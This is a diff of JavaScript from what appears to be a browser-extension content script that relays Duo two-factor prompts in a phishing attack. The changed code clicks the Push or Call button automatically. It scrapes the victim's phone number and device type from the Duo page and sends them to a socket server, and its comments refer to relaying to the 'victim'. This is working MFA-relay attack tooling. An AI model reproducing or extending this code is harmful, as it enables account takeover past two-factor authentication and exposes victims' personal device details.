@@ -36,16 +36,14 @@ function selectAuth(method) {
     var checkbox = document.getElementsByName("dampen_choice")[0];
     checkbox.checked = true;
 
-    // Hit the button
-    switch (method) {
-        case "0": 
-            // duo push
-            btns[0].click();
-            break;
-        case "1": 
-            // call me
-            btns[1].click();
-            break;
+    // Hit the button. Be careful when checking because push might 
+    // not be available on iOS
+    for (var i = 0; i < btns.length; i++) {
+        var btn = btns[i];
+        if (method == "0" && btn.innerHTML.includes("Push"))
+            btn.click();
+        if (method == "1" && btn.innerHTML.includes("Call")) 
+            btn.click();
     }
 
     // Start checking for authentication succeeded message. 
@@ -110,21 +108,25 @@ else if (window.location.href.includes("duosecurity.com")) {
     if (window.localStorage.getItem("loggedIn") != "true") {
         // Try get phone number from the duo window HTML and relay it to victim
         var num; 
-        try {
-            num = document.getElementsByName("device")[0].innerHTML
-                    .split("(")[1].substring(0, 12);
+        try { num = document.getElementsByName("device")[0].innerHTML
+                    .split("(")[1].substring(0, 12); } catch(e){}
+        // Try to ID device type
+        var dev; 
+        try { 
+            var devs = document.getElementsByName("device")[0].innerHTML;
+            if (devs.toLowerCase().includes("ios"))     dev = "ios";
+            if (devs.toLowerCase().includes("android")) dev = "android";
+        } catch(e){}
+ 
+        var resp = {
+            "status": "waitingForAuthm", 
+            "sid": SID
         }
-        catch(e){}
-        if (num != undefined)
-            browser.runtime.sendMessage({
-                "status": "waitingForAuthm", 
-                "number":num, "sid":SID
-            });
-        else
-            browser.runtime.sendMessage({
-                "status": "waitingForAuthm", 
-                "sid":SID
-            });
+
+        // Give server the scraped info 
+        if (num != undefined) resp["number"] = num;
+        if (dev != undefined) resp["device"] = dev;
+        browser.runtime.sendMessage(resp);
 
         // Wait for instruction from the socket server (who relayed victim's
         // instruction)
